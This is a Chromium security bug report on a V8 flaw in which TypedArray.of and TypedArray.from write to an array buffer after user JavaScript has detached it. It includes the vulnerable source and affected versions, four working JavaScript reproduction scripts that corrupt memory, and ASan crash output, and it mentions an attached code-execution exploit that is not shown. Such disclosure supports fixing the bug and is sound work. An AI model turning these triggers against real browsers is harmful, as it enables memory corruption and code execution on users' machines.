<b>VULNERABILITY DETAILS</b>
https://cs.chromium.org/chromium/src/v8/src/builtins/builtins-typedarray-gen.cc?rcl=58a48f4fa8986318524c1808ce66b5f3e6d2fcb4&l=1519
TF_BUILTIN(TypedArrayOf, TypedArrayBuiltinsAssembler) {
[...]
  TNode<Object> receiver = args.GetReceiver();
  GotoIf(TaggedIsSmi(receiver), &if_not_constructor);
  GotoIfNot(IsConstructor(receiver), &if_not_constructor);

  // 5. Let newObj be ? TypedArrayCreate(C, len).
  TNode<JSTypedArray> new_typed_array =
      CreateByLength(context, receiver, SmiTag(length), "%TypedArray%.of");

  TNode<Word32T> elements_kind = LoadElementsKind(new_typed_array);

  // 6. Let k be 0.
  // 7. Repeat, while k < len
  //  a. Let kValue be items[k].
  //  b. Let Pk be ! ToString(k).
  //  c. Perform ? Set(newObj, Pk, kValue, true).
  //  d. Increase k by 1.
  DispatchTypedArrayByElementsKind(
      elements_kind,
      [&](ElementsKind kind, int size, int typed_array_fun_index) {
        TNode<FixedTypedArrayBase> elements =
            CAST(LoadElements(new_typed_array));
        BuildFastLoop(
            IntPtrConstant(0), length,
            [&](Node* index) {
              TNode<Object> item = args.AtIndex(index, INTPTR_PARAMETERS);
              TNode<IntPtrT> intptr_index = UncheckedCast<IntPtrT>(index);
              if (kind == BIGINT64_ELEMENTS || kind == BIGUINT64_ELEMENTS) {
                EmitBigTypedArrayElementStore(
                    new_typed_array, elements, intptr_index, item, context,
                    nullptr /* no need to check for neutered buffer */);
              } else {
                Node* value =
                    PrepareValueForWriteToTypedArray(item, kind, context);

                // GC may move backing store in ToNumber, thus load backing
                // store everytime in this loop.
                TNode<RawPtrT> backing_store =
                    LoadFixedTypedArrayBackingStore(elements);
                StoreElement(backing_store, kind, index, value,
                             INTPTR_PARAMETERS);
              }
              // ToNumber/ToBigInt may execute JavaScript code, but they cannot
              // access arguments array and new typed array.

The last comment is not quite correct. A user-defined typed array constructor may return an already existing array
or call the base class constructor with an already existing array buffer. Then JavaScript code called as a side-effect
of |PrepareValueForWriteToTypedArray()| can neuter the array buffer. |TypedArrayFrom()| contains the same bug.

<b>VERSION</b>
Google Chrome 66.0.3350.0 (Official Build) dev (64-bit) is affected
Google Chrome 66.0.3355.0 (Official Build) canary (64-bit) is affected

Google Chrome 63.0.3239.132 (Official Build) (64-bit) is not affected
Google Chrome 65.0.3325.88 (Official Build) beta (64-bit) is not affected

<b>REPRODUCTION CASE</b>
<script>
neuter = buffer => { try { postMessage("", "invalid", [buffer]) } catch (e) { } };
array = new Uint8Array(128 * 1024 * 1024);
Uint8Array.of.call(function() { return array }, {valueOf() { neuter(array.buffer); } });
</script>

<script>
neuter = buffer => { try { postMessage("", "invalid", [buffer]) } catch (e) { } };
buffer = new ArrayBuffer(128 * 1024 * 1024);
class CustomArray extends Uint8Array { constructor() { super(buffer) } };
CustomArray.of({valueOf() { neuter(buffer); } });
</script>

<script>
neuter = buffer => { try { postMessage("", "invalid", [buffer]) } catch (e) { } };
array = new Uint8Array(128 * 1024 * 1024);
Uint8Array.from.call(function() { return array }, [{valueOf() { neuter(array.buffer); } }], x => x);
</script>

This one is compatible with ASan builds:
<script>
memory = new WebAssembly.Memory({initial: 64 * 1024 * 1024 / 0x10000});
array = new Uint8Array(memory.buffer);
Uint8Array.of.call(function() { return array }, {valueOf() { memory.grow(1); } });
</script>

However, the output is not very helpful:
==11056==ERROR: AddressSanitizer: access-violation on unknown address 0x12e795b40000 (pc 0x12e7739920c7 bp 0x009fc35f98f0 sp 0x009fc35f98a8 T0)
==11056==The signal is caused by a WRITE memory access.
    #0 0x12e7739920c6  (<unknown module>)
    #1 0x9fc35f98ff  (<unknown module>)
    #2 0x12e799c29b20  (<unknown module>)
    #3 0x12e799c29ac0  (<unknown module>)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: access-violation (<unknown module>) 

I have also attached a win64 renderer exploit that uses partial overwrite of a PartitionAlloc free list pointer to gain code
execution.
